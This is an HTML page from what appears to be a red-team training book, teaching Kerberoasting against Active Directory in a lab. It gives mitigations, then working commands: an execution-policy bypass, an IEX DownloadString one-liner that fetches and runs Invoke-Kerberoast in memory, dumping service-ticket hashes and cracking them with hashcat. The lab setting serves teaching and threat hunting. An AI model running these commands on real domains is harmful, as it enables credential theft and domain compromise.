@@ -1,0 +1,354 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Kerberoasting - </title>
+        
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
+                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.2.</strong> Metasploit Basics</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.3.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.3.1.</strong> Functions Overview</a></li><li><ol class="section"><li class="expanded "><a href="lab1.1.html"><strong aria-hidden="true">1.3.1.1.</strong> Lab - Payloads</a></li><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.3.1.2.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab1.3.html"><strong aria-hidden="true">1.3.1.3.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab1.4.html"><strong aria-hidden="true">1.3.1.4.</strong> Lab - Remote Loader</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="powershell.html"><strong aria-hidden="true">1.4.1.</strong> Powershell</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.4.2.</strong> UAC</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.4.3.</strong> AMSI</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.4.4.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.4.5.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.4.6.</strong> SYSCALLS</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.5.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.5.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="chapter_2.html"><strong aria-hidden="true">2.</strong> Chapter 2 </a></li><li><ol class="section"><li class="expanded "><a href="lsassdump.html"><strong aria-hidden="true">2.1.</strong> LSASS Dumping</a></li><li class="expanded "><a href="chapter_2.1.html"><strong aria-hidden="true">2.2.</strong> Memory</a></li><li class="expanded "><a href="chapter_2.2.html" class="active"><strong aria-hidden="true">2.3.</strong> Kerberoasting</a></li><li class="expanded "><a href="chapter_2.3.html"><strong aria-hidden="true">2.4.</strong> Spraying</a></li><li class="expanded "><a href="chapter_2.4.html"><strong aria-hidden="true">2.5.</strong> Relaying</a></li><li class="expanded "><a href="chapter_2.5.html"><strong aria-hidden="true">2.6.</strong> Golden Ticket</a></li><li class="expanded "><a href="chapter_2.6.html"><strong aria-hidden="true">2.7.</strong> DC Sync</a></li><li class="expanded "><a href="chapter_2.7.html"><strong aria-hidden="true">2.8.</strong> Pass the Hash</a></li><li class="expanded "><a href="chapter_2.8.html"><strong aria-hidden="true">2.9.</strong> Evil-WinRM</a></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">3.</strong> Chapter Extra </a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div id="menu-bar-sticky-container">
+                        <div class="left-buttons">
+                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                                <i class="fa fa-bars"></i>
+                            </button>
+                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                                <i class="fa fa-paint-brush"></i>
+                            </button>
+                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                            </ul>
+                            
+                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                                <i class="fa fa-search"></i>
+                            </button>
+                            
+                        </div>
+
+                        <h1 class="menu-title"></h1>
+
+                        <div class="right-buttons">
+                            <a href="print.html" title="Print this book" aria-label="Print this book">
+                                <i id="print-button" class="fa fa-print"></i>
+                            </a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#chapter-22---kerberoasting" id="chapter-22---kerberoasting">Chapter 2.2 - Kerberoasting</a></h1>
+<blockquote>
+<p><strong>So why is Kerberoasting so interesting :</strong></p>
+<ul>
+<li>can be performed from any <em><strong>domain joined machine</strong></em>.</li>
+<li>user needs no special privileges to request a service ticket - <em><strong>ANY</strong></em> authenticated user can do this.</li>
+<li>The target system doesn't even need to be available or even exist anymore, if the SPN (service account that exists is enough).</li>
+<li>Very hard to spot as this blends in with other service ticket requests.</li>
+<li>Cracking the ticket happens <em><strong>off-line</strong></em>.</li>
+</ul>
+</blockquote>
+<p><strong>Here's the gist of it:</strong></p>
+<p>Part of a TGS requested for any SPN, is encrypted with the <strong>NTLM hash of that service account’s plaintext password</strong>, any user can request these TGS tickets and then crack hash of the service account offline, without the risk of account lockout!</p>
+<h1><a class="header" href="#high-level-overview-of-kerberos" id="high-level-overview-of-kerberos">HIGH LEVEL OVERVIEW OF KERBEROS</a></h1>
+<hr />
+<p><img src="./images/00_kerberos1.jpg" alt="image" /></p>
+<div style="text-align: right"><font size="2">Image by SpecterOps (Will Shroeder)</font></div>
+<hr />
+<p><img src="./images/00_kerberos2.jpg" alt="image" /></p>
+<div style="text-align: right"><font size="2">Image by SpecterOps (Will Shroeder)</font></div>
+<hr />
+<blockquote>
+<p><strong>Kerberoasting mitigations:</strong> The best way to prevent adversaries from cracking kerberos tickets is by using very long and complex passwords. Service Accounts should have a minimum of <strong>25 characters</strong>, make sure to frequently <strong>rotate</strong> the passwords and adhere to the <strong>least privilege</strong> principle when assigning rights to the account (i.e. Don't add the account to Domain Admins just because it's easy). You can also consider using Group Managed Service Accounts (<strong>GSMA</strong>) or another third-party product such as a password vault.</p>
+</blockquote>
+<p>The table below shows you the average time it would take to brute-force a password, keep in mind these numbers only reflect hard brute forcing, so not using password dictionaries or rainbox tables.</p>
+<hr />
+<p><img src="./images/kerberoast_01.jpg" alt="Screenshot" /></p>
+<hr />
+<p>A Few useful <strong>CLI</strong> commands:</p>
+<table><thead><tr><th>command</th><th>Details</th></tr></thead><tbody>
+<tr><td><strong>net user SVC_SQL /domain</strong></td><td><em>Query DC for user details.</em></td></tr>
+<tr><td><strong>net user SVC_SQL Password123!</strong></td><td><em>Set the password of a domain user to Password123.</em></td></tr>
+<tr><td><strong>net user /add /domain /active:yes SVC_SQL Password123!</strong></td><td><em>Add a user to the domain, enable the account and set the password.</em></td></tr>
+<tr><td><strong>net user SVC_SQL /domain /active:no</strong></td><td><em>Disable (or enable) a domain account</em></td></tr>
+<tr><td><strong>net group &quot;domain admins&quot; SVC_SQL /ADD /DOMAIN</strong></td><td><em>Add account to &quot;Domain Admins&quot; (or any other group).</em></td></tr>
+<tr><td><strong>setspn -T acme -Q */*</strong></td><td><em>Enumerate all Service Principal Names (SPN), to find service accounts.</em></td></tr>
+<tr><td><strong>setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql</strong></td><td><em>Create an SPN for an account.</em></td></tr>
+</tbody></table>
+<hr />
+<p>And the same in <strong>POWERSHELL</strong>:</p>
+<table><thead><tr><th>command</th><th>Details</th></tr></thead><tbody>
+<tr><td><strong>$secpasswd = ConvertTo-SecureString -String &quot;Password123&quot; -AsPlainText -Force</strong></td><td><em>Put the password in a variable.</em></td></tr>
+<tr><td><strong>New-ADuser -Name 'SVC_SQL' -GivenName 'SVC' -Surname 'SQL' -DisplayName 'SVC_SQL' -AccountPassword $secpasswd -enabled 1</strong></td><td><em>Add a user to the domain, enable the account and set the password.</em></td></tr>
+</tbody></table>
+<hr />
+<p>So now let's set up our lab environment by creating a kerberoastable account that has a weak password.</p>
+<p>First of all open a new command prompt and let's make sure we have domain admin privileges, needed for creating an account in the domain. The <em><strong>password</strong></em> for DA_student = student.</p>
+<pre><code class="language-yaml">runas /user:DA_student@acme.local cmd.exe
+</code></pre>
+<p>Now we are running a command prompt under DA_student account.</p>
+<pre><code class="language-yaml">net user /add /domain /active:yes SVC_SQL Password123!
+</code></pre>
+<p>This will create a new user, activates the account and sets the password to &quot;Password123!&quot;.</p>
+<pre><code class="language-yaml">setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql
+</code></pre>
+<p>The setspn -A command will set up the SPN for the service account, in this case for a service on the domain controller (dc.acme.local) on port 12345.</p>
+<p>Let's check if the SPN was correctly registered:</p>
+<pre><code class="language-yaml">setspn -T acme -Q */*
+</code></pre>
+<p><img src="./images/02_getspnexe.jpg" alt="image" /></p>
+<h1><a class="header" href="#kerberoasting-in-action" id="kerberoasting-in-action">KERBEROASTING IN ACTION</a></h1>
+<hr />
+<ul>
+<li>source: <em><strong><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">GetUserSPNs.ps1</a></strong></em> - link</li>
+</ul>
+<p>Let's see which <strong>SPN</strong>'s exist and to which groups they belong, let try to get some parent process activity going. Open a <strong>command</strong> prompt:</p>
+<pre><code class="language-yaml">powershell.exe -NoP -NonI -Exec Bypass -command &quot;c:\labs\4_KERBEROAST\GetUserSPNs.ps1&quot;
+</code></pre>
+<p><img src="./images/02_getspns_pwsh.jpg" alt="image" /></p>
+<p>Now let's request a ticket for those SPN's, by running the one-liner below you're again doing the attack in a file-less manner by downloading the Invoke-Kerberoast powershell script directly into the memory of <code>powershell.exe</code>:</p>
+<ul>
+<li>source: <em><strong><a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast.ps1</a></strong></em> - link</li>
+</ul>
+<p>Open a <strong>powershell</strong> prompt (as Administrator):</p>
+<pre><code class="language-yaml">IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1&quot;);Invoke-Kerberoast
+</code></pre>
+<p><img src="./images/02_Invoke_Kerb_pwsh.jpg" alt="image" /></p>
+<p>Let's run it locally and save the hashes, this will avoid copy/paste errors, open a <strong>powershell</strong> prompt:</p>
+<pre><code class="language-yaml">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1');
+</code></pre>
+<pre><code class="language-yaml">Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+</code></pre>
+<p><img src="./images/02_IEX_KERB.jpg" alt="image" /></p>
+<p>So by default this will <em><strong>enumerate amd rquest tickets for ALL SPN's</strong></em> on a domain, this of course is suspicious as a user would never to request all those tickets at the same time. A more stealthy adversary will first do his recon (GetUserSPN's for example) and see which service accounts might prove juicy targets, and then just request a <strong>single SPN</strong>:</p>
+<p>In the SAME <strong>powershell</strong> prompt:</p>
+<pre><code class="language-code">invoke-kerberoast -Identity SVC_sql
+</code></pre>
+<blockquote>
+<p>Invoke-Kerberoast's default output is for <strong>John</strong> (the password cracker installed by default on Kali), you need to change the output format to <strong>HashCat</strong> in order to crack the hashes with hashcat.</p>
+</blockquote>
+<p>On your <code>Windows 10 machine</code> use WinSCP to transfer <em><strong>hashes.kerberoast</strong></em> to your Ubuntu machine under the path <em><strong>&quot;/opt/kerberos/&quot;</strong></em> :</p>
+<p>Or you can use SCP to copy the file over:</p>
+<pre><code class="language-yaml">scp Top1000.txt root@192.168.18.204:/opt/kerberos/Top1000.txt
+</code></pre>
+<blockquote>
+<p><strong>IMPORTANT</strong>: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.</p>
+<p>You can view and clear the cache with these commands:</p>
+</blockquote>
+<pre><code class="language-yaml">klist
+</code></pre>
+<pre><code class="language-yaml">klist purge
+</code></pre>
+<p><img src="./images/00_klistpwsh.jpg" alt="image" /></p>
+<p><img src="./images/00_klist_purge.jpg" alt="image" /></p>
+<h1><a class="header" href="#cracking-hashes-using-hashcat" id="cracking-hashes-using-hashcat">CRACKING HASHES USING HASHCAT</a></h1>
+<hr />
+<p>On your <code>Ubuntu Machine</code> we're going to use hashcat to crack the hashes</p>
+<p>First let's install hashcat</p>
+<pre><code class="language-yaml">sudo apt update
+apt install hashcat
+</code></pre>
+<pre><code class="language-yaml">cd /opt/kerberos
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords.txt --potfile-disable -o cracked.txt
+</code></pre>
+<p>To clear the cache:</p>
+<pre><code class="language-yaml">hashcat --remove hashes.kerberoast
+</code></pre>
+<p>To clear the potfile</p>
+<pre><code class="language-yaml">sudo rm ~/.hashcat/hashcat.potfile
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="chapter_2.1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="chapter_2.3.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a href="chapter_2.1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a href="chapter_2.3.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            var socket = new WebSocket("ws://localhost:3001");
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload(true); // force reload from server (not from cache)
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+        
+
+        
+
+        
+        
+        
+        <script type="text/javascript">
+            window.playpen_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
